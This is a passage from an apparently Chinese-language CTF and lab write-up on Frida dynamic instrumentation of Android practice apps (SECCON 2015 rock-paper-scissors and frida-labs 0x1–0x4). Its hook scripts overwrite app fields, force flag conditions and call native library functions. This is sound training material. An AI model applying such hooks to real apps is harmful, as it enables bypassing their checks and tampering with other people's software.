文件</li><li>加载并渲染布局</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.P = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line"><span class="keyword">this</span>.S = (Button) <span class="built_in">findViewById</span>(R.id.button3);</span><br><span class="line"><span class="keyword">this</span>.r = (Button) <span class="built_in">findViewById</span>(R.id.buttonR);</span><br></pre></td></tr></table></figure><p>获取布局文件中定义的按钮空间引用，跟上述的资源ID是类似的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.P.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">this</span>.r.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">this</span>.S.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>为这些按钮设置点击事件监视器</p><p>之后设置flag&#x3D;0完成初始化；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.flag != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="number">1</span>;</span><br><span class="line">        TextView result = (TextView) <span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">        result.<span class="built_in">setText</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        TextView user = (TextView) <span class="built_in">findViewById</span>(R.id.textView);</span><br><span class="line">        TextView laptop = (TextView) <span class="built_in">findViewById</span>(R.id.textView2);</span><br><span class="line">        <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">        Random rm = <span class="keyword">new</span> <span class="built_in">Random</span>();</span><br><span class="line">        <span class="keyword">this</span>.n = rm.<span class="built_in">nextInt</span>(<span class="number">3</span>);</span><br><span class="line">        String[] ss = &#123;<span class="string">&quot;CPU: Paper&quot;</span>, <span class="string">&quot;CPU: Rock&quot;</span>, <span class="string">&quot;CPU: Scissors&quot;</span>&#125;;</span><br><span class="line">        laptop.<span class="built_in">setText</span>(ss[<span class="keyword">this</span>.n]);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="keyword">this</span>.P) &#123;</span><br><span class="line">            user.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Paper&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="keyword">this</span>.r) &#123;</span><br><span class="line">            user.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Rock&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="keyword">this</span>.S) &#123;</span><br><span class="line">            user.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Scissors&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.handler.<span class="built_in">postDelayed</span>(<span class="keyword">this</span>.showMessageTask, <span class="number">1000L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击之后就会触发onClick，逻辑很简单，电脑会随机输出，然后比对，之后延迟1s通过this.showMessageTask来显示结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Handler handler = <span class="keyword">new</span> <span class="built_in">Handler</span>();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Runnable showMessageTask = <span class="keyword">new</span> <span class="built_in">Runnable</span>() &#123; <span class="comment">// from class: com.example.seccon2015.rock_paper_scissors.MainActivity.1</span></span><br><span class="line">    @Override <span class="comment">// java.lang.Runnable</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">run</span>() &#123;</span><br><span class="line">        TextView tv3 = (TextView) MainActivity.<span class="keyword">this</span>.<span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">        <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.n - MainActivity.<span class="keyword">this</span>.m == <span class="number">1</span>) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m - MainActivity.<span class="keyword">this</span>.n == <span class="number">1</span>) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m == MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;DRAW +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m &lt; MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;SECCON&#123;&quot;</span> + String.<span class="built_in">valueOf</span>((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.<span class="built_in">calc</span>()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        MainActivity.<span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设置一个Runnable接口，其中this.handler.postDelayed(this.showMessageTask, 1000L);会调用该接口的run函数且这个接口也只能有一个run函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">点击事件触发</span><br><span class="line">    ↓</span><br><span class="line">handler.postDelayed(task, 1000)</span><br><span class="line">    ↓</span><br><span class="line">Handler将Runnable封装为Message加入消息队列</span><br><span class="line">    ↓ (1秒后)</span><br><span class="line">主线程Looper取出Message</span><br><span class="line">    ↓</span><br><span class="line">Handler执行Message.callback.run()</span><br><span class="line">    ↓</span><br><span class="line">我们的showMessageTask.run()被执行</span><br></pre></td></tr></table></figure><p>发现当连胜次数为1000时能获得一个flag</p><h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>AndroidManifest.xml查看程序的入口Activity</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[V2185A::PID::<span class="number">4093</span> ]-&gt; Java.<span class="built_in">perform</span>(<span class="built_in">function</span> () &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span> (v) &#123;</span><br><span class="line">        <span class="built_in">send</span>(<span class="string">&quot;hook start&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">[V2185A::PID::<span class="number">4093</span> ]-&gt; message: &#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;hook start&#x27;</span>&#125; data: None</span><br></pre></td></tr></table></figure><p>frida中使用MainActivity.onClick.implementation来进行对函数的hook</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.example.seccon2015.rock_paper_scissors.MainActivity<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">        this.n.value = 2;</span></span><br><span class="line"><span class="string">        this.m.value = 1;</span></span><br><span class="line"><span class="string">        this.cnt.value = 999;</span></span><br><span class="line"><span class="string">        send(this.m.value);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)  <span class="comment">//设备连接 超时1s</span></span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">4836</span>) <span class="comment">// attack pid</span></span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)  <span class="comment">//hook脚本</span></span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)    <span class="comment">//信息回调</span></span><br><span class="line">script.<span class="built_in">load</span>()   <span class="comment">//运行脚本</span></span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>() <span class="comment">//保持脚本运行</span></span><br></pre></td></tr></table></figure><p><strong>hook内部类</strong></p><p>可以直接考虑hook掉<code>com.example.seccon2015.rock_paper_scissors.MainActivity.1</code>，这是showMessageTask接口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.example.seccon2015.rock_paper_scissors.MainActivity$<span class="number">1</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.run.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        this.this$0.value.m.value=1;</span></span><br><span class="line"><span class="string">        this.this$0.value.n.value=2;</span></span><br><span class="line"><span class="string">        this.this$0.value.cnt.value=999;</span></span><br><span class="line"><span class="string">        this.run();</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">4836</span>)</span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)</span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><p>要<code>com.example.seccon2015.rock_paper_scissors.MainActivity$1</code>这么写，然后就不能像之前一样直接this.m调用了，因为showMessageTask是内部类，java为每个内部类自动创建了一个指向外部类实例的字段，通常命名为<code>this$0</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java.Field&#123;</span><br><span class="line">holder: com.example.seccon2015.rock_paper_scissors.MainActivity$<span class="number">1</span>@732991e,</span><br><span class="line">fieldType: <span class="number">2</span>,</span><br><span class="line">fieldReturnType: Lcom/example/seccon2015/rock_paper_scissors/MainActivity;,</span><br><span class="line">value: com.example.seccon2015.rock_paper_scissors.MainActivity@8d9c04,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现value就是想要的值， 那么直接<code>this.this$0.value.m.value</code>获取即可</p><p><strong>直接调用方法</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">tv3.<span class="built_in">setText</span>(<span class="string">&quot;SECCON&#123;&quot;</span> + String.<span class="built_in">valueOf</span>((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.<span class="built_in">calc</span>()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        console.<span class="built_in">log</span>((<span class="number">1000</span> + <span class="keyword">this</span>.<span class="built_in">calc</span>())*<span class="number">107</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>也是可以的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        var modules = Process.<span class="built_in">enumerateModules</span>();</span><br><span class="line">        <span class="keyword">for</span>(var i in modules)&#123;</span><br><span class="line">            <span class="comment">// console.log(modules[i].name);</span></span><br><span class="line">            <span class="keyword">if</span> (modules[i].name == <span class="string">&quot;libcalc.so&quot;</span>)&#123;</span><br><span class="line">                var exports = modules[i].<span class="built_in">enumerateExports</span>();</span><br><span class="line">                <span class="keyword">for</span>(var j in exports)&#123;</span><br><span class="line">                    console.<span class="built_in">log</span>(exports[j].name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>列举输出<code>libcalc.so</code>动态库导出的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        var addr = Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libcalc.so&quot;</span>,<span class="string">&quot;Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc&quot;</span>);</span><br><span class="line">        console.<span class="built_in">log</span>(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>输出<code>Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc</code>这个符号对应方法的地址</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        var addr = Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libcalc.so&quot;</span>,<span class="string">&quot;Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc&quot;</span>);</span><br><span class="line">        console.<span class="built_in">log</span>(addr);</span><br><span class="line">        var func = <span class="keyword">new</span> <span class="built_in">NativeFunction</span>(addr,<span class="string">&quot;int&quot;</span>,[]);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="built_in">func</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>使用<code>NativeFunction</code>得到对应的方法，并之后运行该函数</p><h2 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p>一个猜数字的，直接hook掉onClick调用check带有固定参数即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.ad2001.frida0x1.MainActivity$<span class="number">1</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        this.this$0.value.check(1,6);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">5409</span>)</span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)</span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503282033882.png" alt="image-20250327213059058" style="zoom:50%;" /><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><p>直接使用python脚本 attack pid对其进行hook是行不通，在运行的时候会调用完onCreate方法，没有其他的方法调用能让我们进行hook，因此得在启动的瞬间就得直接进行hook的注入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onCreate</span>(bundle);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&quot;触发get_flag方法...&quot;</span>);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="keyword">this</span>.<span class="built_in">get_flag</span>(<span class="number">4919</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>保存为hook.js</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.ad2001.frida0x2 -l hook.js</span><br></pre></td></tr></table></figure><p>就能在模拟器中看到flag啦，虽然还有报error为undefine（但问题应该不大？</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><p>hook掉Checker静态变量code的值，然后再重新调用onClick</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;com.ad2001.frida0x3.MainActivity$1&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        var checker = Java.use(&quot;com.ad2001.frida0x3.Checker&quot;);</span></span><br><span class="line"><span class="string">        checker.code.value=512;</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.attach(<span class="number">2977</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h3><p>在其他方法里有一个get_flag函数，同0x2类似，hook掉onCreate即可</p><figure class="highlight cpp"><table><tr><td 